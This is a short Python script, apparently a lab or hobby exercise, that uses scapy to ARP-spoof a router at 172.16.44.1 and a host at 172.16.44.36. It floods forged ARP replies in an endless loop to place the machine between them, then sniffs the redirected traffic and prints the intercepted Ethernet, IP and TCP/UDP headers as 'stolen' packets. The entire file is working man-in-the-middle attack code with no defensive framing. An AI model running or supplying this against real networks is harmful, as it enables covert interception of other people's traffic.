from scapy.all import get_if_hwaddr, get_if_addr, send, ARP, getmacbyip
import ipaddress
from threading import Thread
from scapy.all import sniff, Ether, IP, ARP, TCP, UDP, ICMP

print("Input Interface: ", end="")
iface = input()
ip = get_if_addr(iface)
mac = get_if_hwaddr(iface)

router_ip = "172.16.44.1"
router_mac = getmacbyip(router_ip)
target_ip = "172.16.44.36"
target_mac = getmacbyip(target_ip)

fake_target = ARP(hwsrc=mac,psrc=target_ip,hwdst=router_mac,pdst=router_ip)
fake_router = ARP(hwsrc=mac,psrc=router_ip,hwdst=target_mac,pdst=target_ip)

def spam_mapping():
    while True:
        send(fake_router, verbose=0)
        send(fake_target, verbose=0)

def print_stolen(packet):
    out = ""
    stolen = False
    l2 = packet[0][0]
    if type(packet[0][0]) == Ether:
        out += f"Ether({l2.src} => {l2.dst})\n"
        l3 = packet[0][1]
        if type(l3) == IP:
            out += f"IP({l3.src} => {l3.dst})\n"
            if l3.dst != ip:
                stolen = True
            l4 = packet[0][2]
            if type(l4) == TCP or type(l4) == UDP:
                out += f"TCP/UDP({l4.sport} => {l4.dport})\n"
    return out if stolen else None


spammer = Thread(target=spam_mapping)
spammer.start()

sniff(iface=iface, prn=print_stolen)


